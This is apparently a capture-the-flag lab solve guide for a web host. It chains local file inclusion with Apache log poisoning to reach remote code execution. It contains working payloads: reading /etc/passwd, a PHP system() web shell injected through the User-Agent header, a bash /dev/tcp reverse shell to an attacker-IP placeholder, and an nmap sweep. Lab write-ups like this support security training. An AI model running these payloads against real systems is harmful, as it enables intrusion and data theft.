# 🔴 Red Team — M1: nova-web Solve Guide

**Challenge:** LFI + Apache Log Poisoning → RCE  
**Technique:** T1190 — Exploit Public-Facing Application  
**Entry Point:** HTTP on port 80 (via floating IP / v-Pub-subnet)

---

## Step 1 — Reconnaissance

Browse to `http://<M1-FLOATING-IP>/` — You'll see the NovaTech Industries portal.  
The HTML source hints at a page viewer: `/view.php?page=`

```bash
curl -s http://<M1-IP>/ | grep -i page
```

---

## Step 2 — Confirm LFI

Test for Local File Inclusion:

```bash
curl "http://<M1-IP>/view.php?page=/etc/passwd"
```

You should see `/etc/passwd` contents rendered in the HTML response.

The developer used `str_replace('../', '', $page)` but didn't restrict absolute paths or PHP wrappers.

---

## Step 3 — Read the Log File

```bash
curl "http://<M1-IP>/view.php?page=/var/log/novatech_access.log"
```

You'll see Apache access log entries. This is the file we'll poison.

---

## Step 4 — Log Poisoning (PHP Code Injection)

Inject PHP code into the log via a crafted User-Agent:

```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" "http://<M1-IP>/"
```

After this request, the access log contains the PHP payload.

---

## Step 5 — Trigger RCE via LFI

Now include the poisoned log and pass a command:

```bash
# Test RCE
curl "http://<M1-IP>/view.php?page=/var/log/novatech_access.log&cmd=id"

# Read the flag
curl "http://<M1-IP>/view.php?page=/var/log/novatech_access.log&cmd=cat+/var/www/html/secret/flag1.txt"
```

---

## Step 6 — Get Reverse Shell (Optional)

```bash
# On attacker machine: nc -lvnp 4444

# URL-encoded reverse shell payload
curl "http://<M1-IP>/view.php?page=/var/log/novatech_access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER-IP>/4444+0>%261'"
```

---

## Step 7 — Find Hint for M2

```bash
cat /var/www/html/secret/hint.txt
# → Scan 11.0.0.0/8 on port 21 for FTP server
nmap -p 21 --open 11.0.0.0/8 --min-rate 2000
```

---

## Flag Location
`/var/www/html/secret/flag1.txt`
